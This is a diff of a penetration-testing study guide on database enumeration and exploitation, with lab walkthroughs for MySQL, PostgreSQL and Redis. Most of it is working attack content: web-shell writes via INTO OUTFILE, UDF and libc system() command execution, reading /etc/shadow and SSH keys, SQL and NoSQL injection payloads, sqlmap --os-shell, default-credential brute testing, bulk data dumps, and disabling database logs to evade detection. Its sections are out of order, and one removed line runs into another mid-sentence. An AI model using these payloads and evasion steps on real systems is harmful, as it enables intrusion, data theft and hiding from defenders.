-cat "$OUTPUT_DIR/SUMMARY_REPORT.txt" | grep -E "(mysql|postgresql|redis|mongodb|CRITICAL|HIGH)"
-echo "================================================================"
-```
-
-### Quick Database Checker Script
-
-```bash
-#!/bin/bash
-# quick_db_check.sh - Fast database service checker for exams
-
-TARGET=$1
-
-if [ -z "$TARGET" ]; then
-    echo "Usage: $0 <target_ip>"
-    exit 1
-fi
-
-echo "[+] Quick database service check for $TARGET"
-
-# Fast port scan for common database ports
-echo "[+] Scanning common database ports..."
-nmap -p 3306,5432,1433,6379,27017 -sV --open $TARGET | grep -E "(mysql|postgresql|ms-sql|redis|mongodb)"
-
-# Quick authentication tests
-echo ""
-echo "[+] Testing common database credentials..."
-
-# Test MySQL
-if nmap -p 3306 $TARGET | grep -q "3306.*open"; then
-    echo -n "MySQL (3306): "
-    timeout 5 mysql -h $TARGET -u root -e "SELECT 'SUCCESS - root with blank password';" 2>/dev/null || \
-    timeout 5 mysql -h $TARGET -u root -proot -e "SELECT 'SUCCESS - root:root';" 2>/dev/null || \
-    timeout 5 mysql -h $TARGET -u admin -padmin -e "SELECT 'SUCCESS - admin:admin';" 2>/dev/null || \
-    echo "Authentication failed"
-fi
-
-# Test PostgreSQL
-if nmap -p 5432 $TARGET | grep -q "5432.*open"; then
-    echo -n "PostgreSQL (5432): "
-    timeout 5 psql -h $TARGET -U postgres -c "SELECT 'SUCCESS - postgres with no password';" 2>/dev/null || \
-    (export PGPASSWORD='postgres'; timeout 5 psql -h $TARGET -U postgres -c "SELECT 'SUCCESS - postgres:postgres';" 2>/dev/null) || \
-    echo "Authentication failed"
-fi
-
-# Test Redis
-if nmap -p 6379 $TARGET | grep -q "6379.*open"; then
-    echo -n "Redis (6379): "
-    timeout 5 redis-cli -h $TARGET ping 2>/dev/null | grep -q "PONG" && echo "SUCCESS - No authentication required" || echo "Authentication required or failed"
-fi
-
-echo ""
-echo "[+] Quick check completed!"
-```
-
----
-
-## 14. Advanced Exploitation Techniques
-
-### Database to System Compromise
-
-#### MySQL Privilege Escalation
-```sql
--- Check for dangerous MySQL privileges
-SELECT user, host, File_priv, Process_priv, Super_priv FROM mysql.user WHERE user = USER();
-
--- File system interaction
-SELECT LOAD_FILE('/etc/passwd');
-SELECT LOAD_FILE('/root/.ssh/id_rsa');
-
--- Write web shell
-SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
-
--- User-Defined Functions (UDF) for code execution
-CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';
-SELECT sys_exec('id');
-```
-
-#### PostgreSQL Advanced Exploitation
-```sql
--- Check PostgreSQL version and capabilities
-SELECT version();
-SELECT current_setting('is_superuser');
-
--- File system access
-COPY (SELECT 'test') TO '/tmp/test.txt';
-
--- Command execution via functions (if permissions allow)
-CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
-SELECT system('whoami > /tmp/whoami.txt');
-
--- Language-based code execution
-CREATE LANGUAGE plpythonu;
-CREATE FUNCTION execute(cmd text) RETURNS text AS $
-import subprocess
-return subprocess.check_output(cmd, shell=True)
-$ LANGUAGE plpythonu;
-
-SELECT execute('id');
-```
-
-### Cross-Database Attacks
-
-#### Database Lateral Movement
-```sql
--- MySQL: Enumerate other database connections
-SHOW PROCESSLIST;
-SELECT user, host FROM mysql.user;
-
--- MSSQL: Linked server exploitation
-SELECT * FROM sys.servers;
-EXEC sp_addlinkedserver 'OTHERAPP', 'SQL Server';
-SELECT * FROM OPENQUERY(OTHERAPP, 'SELECT @@version');
-```
-
-#### Data Exfiltration Techniques
-```bash
-# MySQL bulk data export
-mysqldump -h target -u root -p --all-databases > all_databases.sql
-
-# PostgreSQL data export
-pg_dump -h target -U postgres -W --all > all_databases.sql
-
-# Redis data export
-redis-cli -h target --rdb dump.rdb
-
-# Automated sensitive data extraction
-mysql -h target -u root -p -e "
-SELECT table_schema, table_name, column_name 
-FROM information_schema.columns 
-WHERE column_name REGEXP 'pass|pwd|credit|ssn|social' 
-INTO OUTFILE '/tmp/sensitive_columns.txt';"
-```
-
----
-
-## 15. Defense Evasion
-
-### Avoiding Detection
-
-#### Stealth Scanning Techniques
-```bash
-# Slow scan to avoid IDS detection
-nmap -p 3306,5432,1433 -sS -T1 target
-
-# Fragmented packets
-nmap -p 3306 -f target
-
-# Decoy scanning
-nmap -p 3306 -D 192.168.1.10,192.168.1.11,192.168.1.12 target
-
-# Source port manipulation
-nmap -p 3306 --source-port 53 target
-```
-
-#### Connection Obfuscation
-```bash
-# Use different connection methods
-mysql -h target -u root -p --protocol=TCP --ssl-mode=REQUIRED
-
-# Connect through proxy
-proxychains mysql -h target -u root -p
-
-# Connection timing variations
-for i in {1..5}; do
-    mysql -h target -u root -p -e "SELECT 1;" 2>/dev/null
-    sleep $((RANDOM % 30))
-done
-```
-
-### Log Manipulation
-
-#### MySQL Log Evasion
-```sql
--- Check logging status
-SHOW VARIABLES LIKE 'general_log%';
-SHOW VARIABLES LIKE 'log_output';
-
--- Disable logging temporarily (if privileges allow)
-SET GLOBAL general_log = 'OFF';
--- Perform malicious activities
-SET GLOBAL general_log = 'ON';
-
--- Use comments to obfuscate queries
-SELECT/*comment*/user()/*another comment*/;
-```
-
-#### PostgreSQL Log Evasion
-```sql
--- Check logging configuration
-SHOW log_statement;
-SHOW log_directory;
-
--- Use case variations to avoid pattern matching
-sElEcT * FrOm pg_user;
-
--- Function-based queries to obfuscate intent
-SELECT encode(decode('select * from pg_user', 'escape'), 'base64');
-```
-
----
-
-## 16. Real-World Case Studies
-
-### Case Study 1: E-commerce Application Database Breach
-
-#### Scenario
-- **Target**: Online shopping platform
-- **Initial Access**: Web application vulnerability
-- **Database**: MySQL backend with customer data
-
-#### Attack Chain
-```bash
-# 1. Web application SQL injection discovery
-sqlmap -u "http://shop.target.com/product.php?id=1" --dbs
-
-# 2. Database enumeration
-sqlmap -u "http://shop.target.com/product.php?id=1" -D shop_db --tables
-
-# 3. Customer data extraction
-sqlmap -u "http://shop.target.com/product.php?id=1" -D shop_db -T customers --dump
-
-# 4. Credit card information discovery
-sqlmap -u "http://shop.target.com/product.php?id=1" -D shop_db -T payments -C card_number,expiry,cvv --dump
-
-# 5. Administrative access escalation
-sqlmap -u "http://shop.target.com/product.php?id=1" --os-shell
-```
-
-#### Lessons Learned
-- Input validation prevents SQL injection
-- Database encryption protects sensitive data at rest
-- Proper access controls limit damage scope
-- Regular security testing identifies vulnerabilities
-
-### Case Study 2: Corporate Network Database Compromise
-
-#### Scenario
-- **Target**: Internal corporate network
-- **Initial Access**: Weak database authentication
-- **Impact**: Employee data and financial records exposed
-
-#### Attack Methodology
-```bash
-# 1. Network reconnaissance
-nmap -sn 192.168.10.0/24
-nmap -p 3306,5432,1433 192.168.10.0/24 --open
-
-# 2. Database service identification
-nmap -sV -p 3306,5432,1433 192.168.10.50
-
-# 3. Authentication testing
-mysql -h 192.168.10.50 -u root -p  # blank password successful
-
-# 4. Database enumeration
-mysql> SHOW DATABASES;
-mysql> USE hr_database;
-mysql> SHOW TABLES;
-
-# 5. Sensitive data extraction
-mysql> SELECT employee_id, name, ssn, salary FROM employees;
-mysql> SELECT * FROM payroll WHERE salary > 100000;
-```
-
-#### Mitigation Strategies Implemented
-- Changed default database passwords
-- Implemented network segmentation
-- Enabled database audit logging
-- Restricted administrative access
-- Regular access reviews and monitoring
-
----
-
-## 17. Conclusion and Best Practices
-
-### Key Takeaways for Database Enumeration
-
-#### Critical Success Factors
-1. **Systematic Approach**: Follow a structured methodology for consistent results
-2. **Tool Proficiency**: Master essential tools (Nmap, database clients, SQLMap)
-3. **Quick Recognition**: Rapidly identify database services and types
-4. **Efficient Testing**: Test authentication methods systematically
-5. **Thorough Documentation**: Record all findings for reporting
-
-#### Common Pitfalls to Avoid
-- Rushing through authentication testing without trying common credentials
-- Missing non-standard ports where database services might run
-- Failing to test for NoSQL databases (Redis, MongoDB)
-- Not documenting the enumeration process adequately
-- Overlooking privilege escalation opportunities within databases
-
-### Exam Preparation Checklist
-
-#### Essential Commands (Must Memorize)
-```bash
-# Service Discovery
-nmap -p 3306,5432,1433,6379,27017 -sV target
-
-# Authentication Testing
-mysql -h target -u root -p
-psql -h target -U postgres
-redis-cli -h target
-
-# Basic Enumeration
-SHOW DATABASES; SHOW TABLES; DESCRIBE table_name;
-\l; \dt; \d table_name;
-INFO; KEYS *;
-```
-
-#### Practice Environment Setup
-```bash
-# Setup vulnerable database containers for practice
-docker run -d --name mysql-vuln -e MYSQL_ALLOW_EMPTY_PASSWORD=yes -p 3306:3306 mysql:5.7
-docker run -d --name postgres-vuln -e POSTGRES_HOST_AUTH_METHOD=trust -p 5432:5432 postgres:12
-docker run -d --name redis-vuln -p 6379:6379 redis:latest
-```
-
-#### Final Preparation Steps
-1. **Practice Daily**: Enumerate databases on vulnerable VMs daily
-2. **Time Management**: Complete full enumeration in under 15 minutes
-3. **Screenshot Preparation**: Know what evidence to capture
-4. **Command Shortcuts**: Create aliases for frequently used commands
-5. **Troubleshooting Skills**: Practice recovering from connection issues
-
-### Security Recommendations for Defenders
-
-#### Immediate Actions
-- Change all default database passwords
-- Disable remote root/administrator access
-- Enable authentication on all database services
-- Implement connection encryption (SSL/TLS)
-
-#### Long-term Security Measures
-- Regular security assessments and penetration testing
-- Database activity monitoring and alerting
-- Principle of least privilege for database users
-- Network segmentation and firewall rules
-- Regular backup and recovery testing
-
----
-
-## 📚 Additional Resources and References
-
-### Official Documentation
-- **MySQL**: https://dev.mysql.com/doc/refman/8.0/en/
-- **PostgreSQL**: https://www.postgresql.org/docs/current/
-- **Redis**: https://redis.io/documentation
-- **MongoDB**: https://docs.mongodb.com/
-- **Microsoft SQL Server**: https://docs.microsoft.com/en-us/sql/
-
-### Security Testing Resources
-- **OWASP Database Security**: https://owasp.org/www-project-database-security/
-- **HackTricks Database**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-databases
-- **SQLMap Documentation**: https://sqlmap.org/
-- **Nmap NSE Scripts**: https://nmap.org/nsedoc/
-
-### Practice Environments
-- **VulnHub**: Database-focused vulnerable VMs
-- **HackTheBox**: Database enumeration challenges
-- **DVWA**: Damn Vulnerable Web Application with database backends
-- **SQLi-labs**: SQL injection practice platform
-
-### Community and Learning
-- **Reddit r/netsec**: Network security discussions
-- **InfoSec Community**: Database security forums
-- **YouTube Channels**: Database penetration testing tutorials
-- **Cybrary**: Free database security courses
-
----
-
-*This guide serves as a comprehensive reference for database enumeration in penetration testing contexts. Regular practice with these techniques on authorized systems will improve proficiency and exam readiness. Always ensure proper authorization before conducting any security testing activities.*List all databases
-SHOW DATABASES;
-
--- Select and use a database
-USE database_name;
-
--- List all tables in current database
-SHOW TABLES;
-
--- Get table structure
-DESCRIBE table_name;
-SHOW CREATE TABLE table_name;
-
--- List columns with detailed information
-SHOW COLUMNS FROM table_name;
-
--- Get table information from information_schema
-SELECT table_name, table_rows, data_length 
-FROM information_schema.tables 
-WHERE table_schema = 'database_name';
-```
-
-#### User and Privilege Enumeration
-```sql
--- Current user privileges
-SHOW GRANTS;
-SHOW GRANTS FOR 'username'@'hostname';
-
--- List all MySQL users
-SELECT user, host FROM mysql.user;
-
--- Check for dangerous privileges
-SELECT user, host, Super_priv, File_priv, Process_priv 
-FROM mysql.user;
-
--- List users with specific privileges
-SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
-SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
-```
-
-#### Advanced MySQL Enumeration
-```sql
--- Find sensitive data in column names
-SELECT table_schema, table_name, column_name 
-FROM information_schema.columns 
-WHERE column_name LIKE '%pass%' 
-   OR column_name LIKE '%user%' 
-   OR column_name LIKE '%email%'
-   OR column_name LIKE '%credit%'
-   OR column_name LIKE '%card%';
-
--- Search for specific patterns in database names
-SELECT schema_name FROM information_schema.schemata 
-WHERE schema_name LIKE '%admin%' 
-   OR schema_name LIKE '%user%' 
-   OR schema_name LIKE '%app%';
-
--- Check for stored procedures and functions
-SHOW PROCEDURE STATUS;
-SHOW FUNCTION STATUS;
-
--- Check MySQL configuration
-SHOW VARIABLES;
-SELECT * FROM information_schema.global_variables 
-WHERE variable_name IN ('secure_file_priv', 'general_log', 'log_output');
-```
-
-### PostgreSQL Enumeration
-
-#### Basic Connection and Information
-```bash
-# Connect to PostgreSQL
-psql -h target_ip -U postgres
-
-# Basic information
-SELECT version();                    # PostgreSQL version
-SELECT current_user;                # Current user
-SELECT current_database();          # Current database
-SELECT inet_server_addr();          # Server IP
-SELECT inet_server_port();          # Server port
-```
-
-#### Database and Schema Enumeration
-```sql
--- List all databases
-\l
-SELECT datname FROM pg_database;
-
--- Connect to specific database
-\c database_name
-
--- List schemas
-\dn
-SELECT schema_name FROM information_schema.schemata;
-
--- List tables
-\dt
-SELECT table_name FROM information_schema.tables 
-WHERE table_schema = 'public';
-
--- Table structure
-\d table_name
-SELECT column_name, data_type, is_nullable 
-FROM information_schema.columns 
-WHERE table_name = 'table_name';
-```
-
-#### User and Role Enumeration
-```sql
--- List users and roles
-\du
-SELECT usename FROM pg_user;
-SELECT rolname FROM pg_roles;
-
--- Current user privileges
-SELECT current_user, session_user;
-SELECT * FROM information_schema.role_table_grants 
-WHERE grantee = current_user;
-
--- Check superuser privileges
-SELECT usename, usesuper FROM pg_user;
-SELECT rolname, rolsuper FROM pg_roles WHERE rolsuper = true;
-```
-
-#### Advanced PostgreSQL Enumeration
-```sql
--- Find sensitive columns
-SELECT table_schema, table_name, column_name 
-FROM information_schema.columns 
-WHERE column_name ILIKE '%pass%' 
-   OR column_name ILIKE '%user%' 
-   OR column_name ILIKE '%email%'
-   OR column_name ILIKE '%credit%';
-
--- List all functions and procedures
-\df
-SELECT routine_name, routine_type 
-FROM information_schema.routines 
-WHERE routine_schema = 'public';
-
--- Check PostgreSQL settings
-SHOW ALL;
-SELECT name, setting FROM pg_settings 
-WHERE name IN ('log_statement', 'log_directory', 'data_directory');
-```
-
-### Redis Enumeration
-
-#### Basic Information Gathering
-```bash
-# Connect to Redis
-redis-cli -h target_ip
-
-# Server information
-INFO
-INFO server
-INFO memory
-INFO keyspace
-
-# Configuration
-CONFIG GET "*"
-CONFIG GET "requirepass"  # Check if password is set
-CONFIG GET "dir"          # Working directory
-CONFIG GET "dbfilename"   # Database filename
-```
-
-#### Key Enumeration and Data Access
-```bash
-# List all keys (dangerous on large databases)
-KEYS *
-
-# Better approach - scan with patterns
-SCAN 0 MATCH *user*
-SCAN 0 MATCH *pass*
-SCAN 0 MATCH *session*
-
-# Count keys
-DBSIZE
-
-# Get key information
-TYPE keyname
-TTL keyname
-
-# Access different data types
-GET keyname                    # String
-HGETALL keyname               # Hash
-LRANGE keyname 0 -1           # List
-SMEMBERS keyname              # Set
-ZRANGE keyname 0 -1           # Sorted Set
-```
-
-#### Redis Security Assessment
-```bash
-# Check for dangerous commands
-CONFIG GET "rename-command"
-CONFIG GET "protected-mode"
-
-# Test dangerous operations
-FLUSHALL                      # Clear all data (test only!)
-CONFIG SET dir /tmp           # Change directory
-CONFIG SET dbfilename test    # Change filename
-SAVE                         # Force save to disk
-```
-
-### MongoDB Enumeration
-
-#### Basic Connection and Information
-```bash
-# Connect to MongoDB
-mongo target_ip:27017
-
-# Basic information
-db.version()
-db.runCommand("buildinfo")
-db.runCommand("hostInfo")
-db.adminCommand("listCollections")
-```
-
-#### Database and Collection Enumeration
-```javascript
-// List databases
-show dbs
-db.adminCommand("listDatabases")
-
-// Switch database
-use database_name
-
-// List collections
-show collections
-db.getCollectionNames()
-
-// Collection statistics
-db.collection_name.stats()
-db.collection_name.count()
-
-// Sample documents
-db.collection_name.findOne()
-db.collection_name.find().limit(5)
-```
-
-#### User and Authentication Enumeration
-```javascript
-// List users
-db.getUsers()
-db.system.users.find()
-
-// Current user
-db.runCommand("connectionStatus")
-
-// Check authentication
-db.runCommand({usersInfo: 1})
-```
-
----
-
-## 8. Advanced Techniques
-
-### File Operations and Code Execution
-
-#### MySQL File Operations
-```sql
--- Check file privileges
-SELECT file_priv FROM mysql.user WHERE user = 'current_user';
-
--- Read files from system
-SELECT LOAD_FILE('/etc/passwd');
-SELECT LOAD_FILE('/etc/shadow');
-SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
-
--- Write files to system (web shell upload)
-SELECT "<?php system($_GET['cmd']); ?>" 
-INTO OUTFILE '/var/www/html/shell.php';
-
-SELECT "<?php echo shell_exec($_GET['cmd']); ?>" 
-INTO OUTFILE '/tmp/cmd.php';
-
--- Log file analysis
-SELECT LOAD_FILE('/var/log/mysql/mysql.log');
-```
-
-#### PostgreSQL Advanced Operations
-```sql
--- Check for file access functions
-SELECT current_setting('log_directory');
-SELECT current_setting('data_directory');
-
--- Command execution (if available)
-CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
-SELECT system('id');
-
--- Copy data to files
-COPY (SELECT 'test') TO '/tmp/test.txt';
-```
-
-### Database Interconnection Analysis
-
-#### Cross-Database Queries
-```sql
--- MySQL: Access other databases
-SELECT * FROM information_schema.schemata;
-SELECT table_name FROM information_schema.tables WHERE table_schema = 'other_db';
-
--- PostgreSQL: Database links
-SELECT * FROM pg_database;
-\c other_database
-```
-
-#### Network Analysis from Database
-```sql
--- MySQL: Network connectivity testing
-SELECT SUBSTRING_INDEX(USER(), '@', -1) AS host;
-SHOW VARIABLES LIKE 'hostname';
-
--- Check for linked servers (MSSQL)
-SELECT * FROM sys.servers;
-EXEC sp_linkedservers;
-```
-
----
-
-## 9. Common Vulnerabilities
-
-### SQL Injection Identification
-
-#### Manual Testing
-```bash
-# Basic SQL injection tests
-curl "http://target/app.php?id=1'"
-curl "http://target/app.php?id=1' OR '1'='1"
-curl "http://target/app.php?id=1' UNION SELECT 1,2,3--"
-
-# Time-based blind SQL injection
-curl "http://target/app.php?id=1' AND SLEEP(5)--"
-curl "http://target/app.php?id=1'; WAITFOR DELAY '00:00:05'--"
-```
-
-#### Automated Testing with SQLMap
-```bash
-# Basic SQLMap usage
-sqlmap -u "http://target/app.php?id=1" --dbs
-sqlmap -u "http://target/app.php?id=1" -D database_name --tables
-sqlmap -u "http://target/app.php?id=1" -D database_name -T table_name --columns
-sqlmap -u "http://target/app.php?id=1" -D database_name -T table_name -C column1,column2 --dump
-
-# Advanced SQLMap options
-sqlmap -u "http://target/app.php?id=1" --os-shell
-sqlmap -u "http://target/app.php?id=1" --sql-shell
-sqlmap -u "http://target/app.php?id=1" --file-read="/etc/passwd"
-```
-
-### NoSQL Injection
-
-#### MongoDB Injection Testing
-```bash
-# Basic MongoDB injection
-curl "http://target/login" -d "username[$ne]=null&password[$ne]=null"
-curl "http://target/search" -d "query[$regex]=.*"
-
-# NoSQLMap usage
-python nosqlmap.py -u "http://target/login" --data "username=admin&password=password"
-```
-
-### Configuration Vulnerabilities
-
-#### Common Misconfigurations
-- **Default credentials** not changed
-- **Remote access** enabled without proper security
-- **Weak passwords** or no passwords
-- **Excessive privileges** granted to users
-- **Unencrypted connections** allowed
-- **Debug/test databases** left accessible
-- **File system access** permissions too broad
-
----
-
-## 10. Reporting & Documentation
-
-### Evidence Collection Checklist
-
-#### Screenshots Required
-- [ ] Port scan results showing database services
-- [ ] Successful authentication attempts
-- [ ] Database enumeration outputs
-- [ ] Sensitive data discoveries
-- [ ] Privilege escalation evidence
-- [ ] Configuration vulnerabilities
-
-#### Command Documentation
-```markdown
-### Commands Executed
-
-```bash
-# Service Discovery
-nmap -p 3306,5432,1433 -sV 192.168.1.100
-
-# Authentication Testing  
+# Step 4: Exploit empty root password
 mysql -h 192.168.1.100 -u root -p
 
-# Database Enumeration
-SHOW DATABASES;
-USE webapp_db;
-SHOW TABLES;
-SELECT * FROM users LIMIT 10;
-```
-```
+# Successful authentication attempt:
+Enter password: [Press Enter for empty password]
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 15
+Server version: 5.7.40-0ubuntu0.18.04.1 (Ubuntu)
 
-### Professional Report Template
+# 🎉 Authentication Success:
+# ✅ Root access gained with empty password
+# ✅ Full administrative privileges obtained
+# ✅ Database server compromise achieved
 
-```markdown
-# Database Security Assessment Report
+# Step 5: Basic system and database enumeration
+mysql> SELECT VERSION();
++-------------------------+
+| VERSION()               |
++-------------------------+
+| 5.7.40-0ubuntu0.18.04.1|
++-------------------------+
 
-## Executive Summary
-- **Target System**: 192.168.1.100
-- **Assessment Date**: November 26, 2024
-- **Databases Identified**: MySQL, PostgreSQL, Redis
-- **Critical Findings**: Default credentials, unencrypted connections, sensitive data exposure
+mysql> SELECT USER();
++----------------+
+| USER()         |
++----------------+
+| root@192.168.1.5 |
++----------------+
 
-## Technical Findings
-
-### 1. MySQL Service (Port 3306)
-**Vulnerability**: Default credentials
-- **Impact**: HIGH
-- **Evidence**: Successfully logged in using root/(blank)
-- **Affected Data**: User accounts, payment information
-- **Recommendation**: Change default passwords, implement strong authentication
-
-### 2. PostgreSQL Service (Port 5432)
-**Vulnerability**: Weak authentication
-- **Impact**: HIGH  
-- **Evidence**: postgres/postgres credentials accepted
-- **Affected Data**: Employee records, salary information
-- **Recommendation**: Enforce password complexity, enable connection encryption
-
-### 3. Redis Service (Port 6379)
-**Vulnerability**: No authentication required
-- **Impact**: MEDIUM
-- **Evidence**: Direct access without credentials
-- **Affected Data**: Session tokens, cached user data
-- **Recommendation**: Enable authentication, restrict network access
-
-## Risk Assessment Matrix
-
-| Vulnerability | Likelihood | Impact | Risk Level |
-|---------------|------------|---------|------------|
-| Default MySQL credentials | High | High | **CRITICAL** |
-| PostgreSQL weak auth | High | High | **CRITICAL** |
-| Redis no authentication | Medium | Medium | **HIGH** |
-| Unencrypted connections | High | Medium | **HIGH** |
-
-## Recommendations
-
-### Immediate Actions (Critical Priority)
-1. Change all default database passwords
-2. Disable remote root access for MySQL
-3. Enable Redis authentication
-4. Restrict database network access
-
-### Short-term Actions (High Priority)
-1. Implement SSL/TLS encryption for database connections
-2. Create dedicated database users with minimal privileges
-3. Enable database audit logging
-4. Remove test/demo databases
-
-### Long-term Actions (Medium Priority)
-1. Implement database activity monitoring
-2. Regular security assessments
-3. Database hardening according to CIS benchmarks
-4. Staff security training
-
-## Detailed Technical Evidence
-
-### MySQL Enumeration Results
-```sql
 mysql> SHOW DATABASES;
 +--------------------+
 | Database           |
 +--------------------+
 | information_schema |
+| employees          |
 | mysql              |
 | performance_schema |
+| sys                |
 | webapp_db          |
 +--------------------+
+6 rows in set (0.01 sec)
+```
 
+#### **Phase 4: Sensitive Data Discovery and Extraction**
+```bash
+# Step 6: Investigate custom databases for sensitive information
 mysql> USE webapp_db;
+Database changed
+
 mysql> SHOW TABLES;
 +---------------------+
 | Tables_in_webapp_db |
 +---------------------+
-| users               |
-| admin               |
-| payments            |
+| admin_users         |
+| customer_data       |
+| payment_info        |
+| user_sessions       |
 +---------------------+
-```
 
-### Sensitive Data Samples
-**Users Table Structure:**
-```sql
-mysql> DESCRIBE users;
+# Step 7: Analyze table structures for sensitive data
+mysql> DESCRIBE admin_users;
 +----------+-------------+------+-----+---------+-------+
 | Field    | Type        | Null | Key | Default | Extra |
 +----------+-------------+------+-----+---------+-------+
-| id       | int(11)     | NO   | PRI | NULL    |       |
+| id       | int(11)     | NO   | PRI | NULL    | auto_increment |
 | username | varchar(50) | NO   |     | NULL    |       |
-| password | varchar(50) | NO   |     | NULL    |       |
+| password | varchar(255)| NO   |     | NULL    |       |
 | email    | varchar(100)| YES  |     | NULL    |       |
+| role     | varchar(20) | YES  |     | user    |       |
 +----------+-------------+------+-----+---------+-------+
+
+# Step 8: Extract administrative credentials
+mysql> SELECT username, password, email, role FROM admin_users;
++----------+----------------------------------+----------------------+-------+
+| username | password                         | email                | role  |
++----------+----------------------------------+----------------------+-------+
+| admin    | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 | admin@company.com    | admin |
+| manager  | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | manager@company.com  | user  |
++----------+----------------------------------+----------------------+-------+
+
+# 🎯 Critical Data Extracted:
+# ✅ Administrative usernames and password hashes obtained
+# ✅ Email addresses for potential social engineering
+# ✅ Role-based access information discovered
 ```
 
-**Critical Finding**: Passwords stored in plaintext format
-```sql
-mysql> SELECT username, password FROM users LIMIT 3;
-+----------+----------+
-| username | password |
-+----------+----------+
-| admin    | admin123 |
-| john     | password |
-| alice    | qwerty   |
-+----------+----------+
+### **Lab Scenario 2: PostgreSQL Advanced Enumeration**
+
+#### **Phase 1: Service Detection and Version Analysis**
+```bash
+# Step 1: PostgreSQL service discovery
+nmap -p 5432 -sV --script pgsql-brute 192.168.1.101
+
+# Service detection results:
+PORT     STATE SERVICE  VERSION
+5432/tcp open  postgresql PostgreSQL DB 12.8 (Ubuntu 12.8-0ubuntu0.20.04.1)
+| pgsql-brute:
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 85 guesses in 6 seconds, average tps: 14.2
+
+# Step 2: Manual authentication testing with common credentials
+psql -h 192.168.1.101 -U postgres
+
+# Authentication attempt:
+Password for user postgres: [Try: postgres]
+psql (14.5, server 12.8)
+WARNING: psql major version 14, server major version 12.
+         Some psql features might not work.
+Type "help" for help.
+
+postgres=#
+
+# 🎉 Successful Authentication:
+# ✅ Default postgres:postgres credentials accepted
+# ✅ Database administrator access achieved
+# ✅ Version mismatch noted (potential compatibility issues)
 ```
+
+#### **Phase 2: Database and Schema Enumeration**
+```bash
+# Step 3: System information gathering
+postgres=# SELECT version();
+                                                         version
+--------------------------------------------------------------------------------------------------------------------------
+ PostgreSQL 12.8 (Ubuntu 12.8-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, 64-bit
+
+postgres=# SELECT current_user, session_user;
+ current_user | session_user
+--------------+--------------
+ postgres     | postgres
+
+# Step 4: Database discovery and analysis
+postgres=# \l
+                              List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
+------------+----------+----------+-------------+-------------+-----------------------
+ companydb  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+
+# Step 5: Investigate custom database
+postgres=# \c companydb
+You are now connected to database "companydb" as user "postgres".
+
+companydb=# \dt
+                 List of relations
+ Schema |    Name     | Type  |  Owner
+--------+-------------+-------+----------
+ public | employees   | table | postgres
+ public | finances    | table | postgres
+ public | hr_records  | table | postgres
+ public | salaries    | table | postgres
+```
+
+#### **Phase 3: Sensitive Data Analysis and Extraction**
+```bash
+# Step 6: Analyze table structures for sensitive information
+companydb=# \d employees
+                                     Table "public.employees"
+    Column    |         Type          | Collation | Nullable |                Default
+--------------+-----------------------+-----------+----------+----------------------------------------
+ employee_id  | integer               |           | not null | nextval('employees_employee_id_seq'::regclass)
+ first_name   | character varying(50) |           | not null |
+ last_name    | character varying(50) |           | not null |
+ ssn          | character varying(11) |           |          |
+ email        | character varying(100)|           |          |
+ department   | character varying(50) |           |          |
+ hire_date    | date                  |           |          |
+
+# Step 7: Extract sample sensitive data (limited for proof of concept)
+companydb=# SELECT employee_id, first_name, last_name, ssn, email FROM employees LIMIT 5;
+ employee_id | first_name | last_name |     ssn     |           email
+-------------+------------+-----------+-------------+---------------------------
+           1 | John       | Smith     | 123-45-6789 | john.smith@company.com
+           2 | Jane       | Doe       | 987-65-4321 | jane.doe@company.com
+           3 | Michael    | Johnson   | 555-12-3456 | m.johnson@company.com
+           4 | Sarah      | Williams  | 111-22-3333 | s.williams@company.com
+           5 | David      | Brown     | 444-55-6666 | d.brown@company.com
+
+# 🚨 Critical Findings:
+# ✅ Social Security Numbers (SSN) stored in plaintext
+# ✅ Employee personal information accessible
+# ✅ Email addresses available for social engineering
+# ✅ No data encryption or access controls detected
+```
+
+### **Lab Scenario 3: Redis Cache Database Assessment**
+
+#### **Phase 1: Redis Service Discovery and Access Testing**
+```bash
+# Step 1: Redis service detection
+nmap -p 6379 -sV --script redis-info 192.168.1.102
+
+# Service enumeration results:
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 6.2.6
+| redis-info:
+|   Version: 6.2.6
+|   Operating System: Linux 5.4.0-74-generic x86_64
+|   Architecture: 64 bits
+|   Process ID: 1234
+|   Used CPU (sys): 1.45
+|   Used CPU (user): 2.31
+|   Connected clients: 2
+|   Connected slaves: 0
+|   Used memory: 2.35M
+|   Role: master
+
+# Step 2: Attempt direct connection (no authentication)
+redis-cli -h 192.168.1.102
+
+# Connection success verification:
+192.168.1.102:6379> PING
+PONG
+
+192.168.1.102:6379> INFO server
+# Redis version=6.2.6
+# os=Linux 5.4.0-74-generic x86_64
+# arch_bits=64
+# multiplexing_api=epoll
+# process_id=1234
+# run_id=a1b2c3d4e5f6789012345678901234567890abcd
+# tcp_port=6379
+
+# 🚨 Security Issue Identified:
+# ✅ Redis accessible without authentication
+# ✅ Server information disclosed
+# ✅ Administrative commands available
+```
+
+#### **Phase 2: Redis Data Enumeration and Analysis**
+```bash
+# Step 3: Database size and key analysis
+192.168.1.102:6379> DBSIZE
+(integer) 847
+
+192.168.1.102:6379> KEYS *session*
+1) "user_session:12345"
+2) "user_session:67890"
